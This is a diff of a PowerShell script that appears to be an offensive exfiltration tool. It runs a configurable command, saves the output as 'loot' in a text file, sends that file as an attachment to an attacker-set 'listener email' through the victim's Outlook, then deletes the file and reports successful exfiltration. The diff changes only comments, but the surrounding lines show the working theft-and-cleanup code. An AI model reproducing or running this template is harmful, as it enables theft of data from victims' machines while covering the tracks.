@@ -15,13 +15,14 @@ __         __   ____   _        ___      __     ____     ______      _____      
 # The email to send the loot to
 $listenerEmail = "EMAIL"
 
+# The email contents
 $emailSubject = "SUBJECT"
 $emailBody = "BODY"
 
-# The full path for the file that'll contain the loot
+# The full path of the file that'll contain the loot
 $filePath = "./FILENAME.txt" 
 
-# The commands to fetch the desired information
+# The commands to execute
 $command = Write-Host "tmp"
 
 # ---------------------------------------------------------------------------------- #
@@ -82,6 +83,7 @@ $command > $filePath
 # Step 5: Exfiltrate the text file containing the loot using Outlook                 #
 # ---------------------------------------------------------------------------------- #
 
+# Send the loot to the listener email
 $ATTACHMENT = $filePath
 $outlook = New-Object -comobject outlook.application
 $email = $outlook.CreateItem(0)
@@ -97,6 +99,7 @@ $outlook.Quit()
 # ---------------------------------------------------------------------------------- #
 
 del $filePath > $null  
+
 Write-Host ""
 Write-Host "[SUCCESS] Data exfiltrated successfully." -ForegroundColor Green
 Write-Host "Now exiting ..."
